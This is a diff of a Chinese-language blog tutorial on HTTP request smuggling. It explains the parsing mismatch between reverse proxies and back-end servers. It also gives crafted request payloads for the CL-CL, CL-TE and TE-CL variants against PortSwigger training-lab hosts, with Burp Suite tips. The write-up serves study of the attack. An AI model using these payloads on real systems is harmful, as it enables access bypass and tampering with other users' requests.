@@ -354,14 +354,113 @@ Wiki\r\n → chunk-data CRLF</code></pre>
  in\r\n\r\nchunks.\r\n</code></pre>
 <p><code>chunk-data= in\r\n\r\nchunks.\r\n</code>，1空格 + 2in + 4\r\n\r\n + 7chunk.= 14字节 14(dec)=e(hex)</p>
 <pre><code>0\r\n → 1*(&quot;0&quot;) [ chunk-ext ] CRLF</code></pre>
-<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>这些方法通过各种形式提高网络传输速率，但是在一些特殊的情况下会出现一些相应的安全问题</p>
-<p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取</p>
+<h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取</p>
 <p><strong>👇一个很典型的拓扑结构</strong></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%208.png" alt="screenshot 8"></p>
-<p>一般来说，反向代理与后端服务器不会使用<code>pipeline</code>技术，甚至也不会去使用<code>Keep-Alive</code>，更多时候反向代理采取的措施是<strong>重用TCP链接</strong>，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器IP相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用也就顺理成章</p>
+<p>一般来说，反向代理与后端服务器不会使用<code>pipeline</code>技术，甚至也不会去使用<code>Keep-Alive</code>，更多时候是<strong>重用TCP链接</strong>，这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，因此<strong>不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用</strong></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%209.png" alt="screenshot 9"></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2010.png" alt="screenshot 10"></p>
 <p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2011.png" alt="screenshot 11"></p>
+<p>当攻击者向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了<strong>HTTP走私攻击</strong></p>
+<p><code>HTTP Smuggling</code>攻击正是基于<strong>反向代理</strong>与<strong>后端服务器</strong>对于HTTP请求解析处理不一致，利用这种差异性可以在一个HTTP请求中<strong>嵌入</strong>另一个HTTP请求，以达到<strong>走私请求</strong>的目的，直接表现为<strong>可以访问内网服务</strong>，或者造成一些其他攻击</p>
+<h1 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h1><p><strong>❓既然HTTP Smuggling是基于解析差异，那其会有什么样的解析差异</strong></p>
+<p>对上述构架场景进行简化并把后端服务器固定为一台，架构类似于👇示意图</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2012.png" alt="screenshot 12"></p>
+<p><code>Content-Length</code>与<code>Transfer-Encoding</code>均可以作为POST数据传输时处理body的方式</p>
+<p><strong>对字段处理优先规则有👇简写规则</strong></p>
+<ul>
+<li><code>CL-TE</code>代表Front以<code>Content-Length</code>优先处理，Backend以<code>Transfer-Encoding</code>优先处理</li>
+<li><code>TE-CL</code>代表Front以<code>Transfer-Encoding</code>优先处理，Backend以<code>Content-Length</code>优先处理</li>
+</ul>
+<p>并且Front代表的是反向代理的<strong>前端服务器</strong>，Backend代表的是处理请求的<strong>后端服务器</strong></p>
+<h2 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h2><p>影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只是GET比较常见</p>
+<p>在GET请求上发送有效内容正文可能会导致某些现有实现拒绝该请求；假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私</p>
+<p><strong>👇构造请求</strong></p>
+<pre><code>GET / HTTP/1.1\r\n 👈 HTTP/1.1存在Pipeline技术
+Host: example.com\r\n
+Content-Length: 44\r\n
+
+GET /secret HTTP/1.1\r\n
+Host: example.com\r\n
+\r\n</code></pre>
+<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后因为不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求，这就造成了请求走私</p>
+<pre><code>第一个
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+
+第二个
+GET /secret HTTP/1.1\r\n
+Host: example.com\r\n</code></pre>
+<h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2015.png" alt="screenshot 15"></p>
+<p>当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。但是总有服务器不严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理</p>
+<p><strong>恶意攻击者可以构造特殊请求</strong></p>
+<pre><code>POST / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
+
+12345\r\n
+a</code></pre>
+<p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去</p>
+<p>此时缓冲区还剩余<code>a</code>，对于后端服务器来说，<code>a</code>是下个请求的一部分，但是还没有传输完毕。此时恰有其他正常用户对服务器进行请求</p>
+<p><strong>假设请求如图所示</strong></p>
+<pre><code>GET /index.html HTTP/1.1\r\n
+Host: example.com\r\n</code></pre>
+<p>由于代理服务器与源站服务器之间一般会重用TCP连接，这时候正常用户的请求就拼接到<code>a</code>后面，当后端服务器接收完毕后，它实际处理的请求👇</p>
+<pre><code>aGET /index.html HTTP/1.1\r\n
+Host: example.com\r\n</code></pre>
+<p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，后续可以扩展成类似于CSRF的攻击方式</p>
+<p>但是两个<code>Content-Length</code>这种请求包太过理想化，一般服务器都不会接受这种存在两个请求头的请求包</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2013.png" alt="screenshot 13"></p>
+<p>👆规定如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题</p>
+<h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p><code>CL-TE</code>就是当收到存在两个请求头的请求包时，前端代理服务器未遵守规定只处理<code>Content-Length</code>这一请求头，而后端服务器遵守<code>RFC2616</code>规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头</p>
+<p><strong>构造请求包</strong></p>
+<pre><code>POST / HTTP/1.1
+Host: acc91f081f6b53ef80db2070001c003b.web-security-academy.net
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=JdG4YNrmVLC60vBG8Cz360k8MLZOacwO
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+0\r\n → 3
+\r\n → 2
+G → 1</code></pre>
+<p>发送两次请求即可实现预期响应，原理与<code>CL-CL</code>相同</p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2016.png" alt="screenshot 16"></p>
+<p>‼️<strong>如果要对<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">靶机</a>进行一次成功的HTTP Smuggling攻击，还需要对请求包以及Burp Suite进行修改</strong></p>
+<ol>
+<li><p>取消自动更新<code>Content-Length</code></p>
+<p><img src="%E5%AD%A6%E4%B9%A0HTTP-Smuggling-%E6%94%BB%E5%87%BB/screenshot%2017.png" alt="screenshot 17"></p>
+</li>
+<li><p>去除请求包中<code>Cache-Control</code>以及<code>Sec-Fetch-xxx</code>头字段</p>
+</li>
+</ol>
+<h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><pre><code>POST / HTTP/1.1
+Host: acc11fbe1f22cf4980aa268a00d100e0.web-security-academy.net
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=cK6dqUd8iRozhaKgF089EngXeMFbrU27
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+\r\n
+12\r\n
+GPOST / HTTP/1.1\r\n
+\r\n
+0\r\n
+\r\n</code></pre>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p>
 <p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
 <p><strong>郑重感谢</strong></p>
